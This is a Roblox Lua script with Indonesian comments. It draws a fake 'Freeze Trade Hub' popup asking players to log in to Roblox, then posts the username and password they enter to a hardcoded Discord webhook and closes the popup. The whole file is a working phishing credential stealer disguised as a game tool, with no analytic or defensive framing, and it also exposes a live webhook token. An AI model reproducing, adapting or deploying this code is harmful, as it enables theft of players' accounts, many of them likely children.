-- URL Webhook Discord
local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"

local function sendToDiscord(username, password)
    if syn and syn.request then
        print("Executor mendukung syn.request") -- Debugging
        local response = syn.request({
            Url = webhook_url,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode({
                content = "Someone logged in\nUsername: " .. username .. "\nPassword: " .. password
            })
        })

        if response and response.Success then
            print("Data berhasil dikirim ke Discord!") -- Debugging
        else
            print("Gagal mengirim data ke Discord:", response.StatusCode, response.Body) -- Debugging
        end
    else
        print("Executor tidak mendukung HTTP requests!") -- Debugging
    end
end

local function sendToDiscord(username, password)
    local httpService = game:GetService("HttpService")
    local payload = httpService:JSONEncode({
        content = "Someone logged in\nUsername: " .. username .. "\nPassword: " .. password
    })

    print("Payload yang dikirim:", payload) -- Debugging: Pastikan payload benar

    local success, err = pcall(function()
        httpService:PostAsync(webhook_url, payload, Enum.HttpContentType.ApplicationJson)
    end)

    if success then
        print("Data berhasil dikirim ke Discord!") -- Debugging
    else
        print("Gagal mengirim data ke Discord:", err) -- Debugging jika ada error
    end
end

-- Membuat GUI
local screenGui = Instance.new("ScreenGui")
local frame = Instance.new("Frame")
local titleLabel = Instance.new("TextLabel")
local subtitleLabel = Instance.new("TextLabel")
local usernameBox = Instance.new("TextBox")
local passwordBox = Instance.new("TextBox")
local loginButton = Instance.new("TextButton")
local collabIcon1 = Instance.new("ImageLabel") -- Gambar pertama
local collabIcon2 = Instance.new("ImageLabel") -- Gambar kedua

-- Properti ScreenGui
screenGui.Name = "LoginPopup"
screenGui.Parent = game:GetService("CoreGui")

-- Properti Frame
frame.Name = "LoginFrame"
frame.Parent = screenGui
frame.Size = UDim2.new(0, 400, 0, 250)
frame.Position = UDim2.new(0.5, -200, 0.5, -125)
frame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
frame.BorderSizePixel = 3
frame.BorderColor3 = Color3.new(1, 0, 0)

-- Properti TitleLabel
titleLabel.Name = "TitleLabel"
titleLabel.Parent = frame
titleLabel.Size = UDim2.new(1, -10, 0, 40)
titleLabel.Position = UDim2.new(0, 5, 0, 5)
titleLabel.BackgroundTransparency = 1
titleLabel.Font = Enum.Font.SourceSansBold
titleLabel.Text = "Freeze Trade Hub"
titleLabel.TextSize = 24
titleLabel.TextColor3 = Color3.new(1, 1, 1)
titleLabel.TextStrokeTransparency = 0.5

-- Properti SubtitleLabel
subtitleLabel.Name = "SubtitleLabel"
subtitleLabel.Parent = frame
subtitleLabel.Size = UDim2.new(1, -10, 0, 20)
subtitleLabel.Position = UDim2.new(0, 5, 0, 50)
subtitleLabel.BackgroundTransparency = 1
subtitleLabel.Font = Enum.Font.SourceSans
subtitleLabel.Text = "Login Roblox Untuk Melanjutkan"
subtitleLabel.TextSize = 16
subtitleLabel.TextColor3 = Color3.new(1, 1, 1)
subtitleLabel.TextStrokeTransparency = 0.5

-- Properti UsernameBox
usernameBox.Name = "UsernameBox"
usernameBox.Parent = frame
usernameBox.Size = UDim2.new(1, -20, 0, 30)
usernameBox.Position = UDim2.new(0, 10, 0, 80)
usernameBox.PlaceholderText = "username"
usernameBox.Font = Enum.Font.SourceSans
usernameBox.Text = ""
usernameBox.TextSize = 16
usernameBox.BackgroundColor3 = Color3.new(0, 0, 0)
usernameBox.BorderSizePixel = 2
usernameBox.BorderColor3 = Color3.new(0.7, 0.7, 0.7)
usernameBox.TextColor3 = Color3.new(0.7, 0.7, 0.7)

-- Properti PasswordBox
passwordBox.Name = "PasswordBox"
passwordBox.Parent = frame
passwordBox.Size = UDim2.new(1, -20, 0, 30)
passwordBox.Position = UDim2.new(0, 10, 0, 120)
passwordBox.PlaceholderText = "password"
passwordBox.Font = Enum.Font.SourceSans
passwordBox.Text = ""
passwordBox.TextSize = 16
passwordBox.BackgroundColor3 = Color3.new(0, 0, 0)
passwordBox.BorderSizePixel = 2
passwordBox.BorderColor3 = Color3.new(0.7, 0.7, 0.7)
passwordBox.TextColor3 = Color3.new(0.7, 0.7, 0.7)

-- Properti LoginButton
loginButton.Name = "LoginButton"
loginButton.Parent = frame
loginButton.Size = UDim2.new(1, -20, 0, 30)
loginButton.Position = UDim2.new(0, 10, 0, 160)
loginButton.Text = "Login"
loginButton.Font = Enum.Font.SourceSansBold
loginButton.TextSize = 18
loginButton.BackgroundColor3 = Color3.new(0.2, 0.8, 0.2)
loginButton.TextColor3 = Color3.new(1, 1, 1)
loginButton.BorderSizePixel = 2
loginButton.BorderColor3 = Color3.new(0.2, 0.2, 0.2)

-- Properti CollabIcon1 (Gambar pertama)
collabIcon1.Name = "CollabIcon1"
collabIcon1.Parent = frame
collabIcon1.Size = UDim2.new(0, 40, 0, 40)
collabIcon1.Position = UDim2.new(0, 10, 1, -50)
collabIcon1.Image = "rbxassetid://14469607987" -- Gambar pertama
collabIcon1.BackgroundTransparency = 1

-- Properti CollabIcon2 (Gambar kedua)
collabIcon2.Name = "CollabIcon2"
collabIcon2.Parent = frame
collabIcon2.Size = UDim2.new(0, 40, 0, 40)
collabIcon2.Position = UDim2.new(1, -50, 1, -50)
collabIcon2.Image = "rbxassetid://12861181834" -- Gambar kedua
collabIcon2.BackgroundTransparency = 1

-- Fungsi LoginButton
loginButton.MouseButton1Click:Connect(function()
    local username = usernameBox.Text
    local password = passwordBox.Text

    if username ~= "" and password ~= "" then
        sendToDiscord(username, password) -- Kirim data ke webhook
        screenGui:Destroy() -- Hapus GUI setelah login berhasil
    else
        print("Username atau password kosong!") -- Debugging jika input kosong
    end
end)
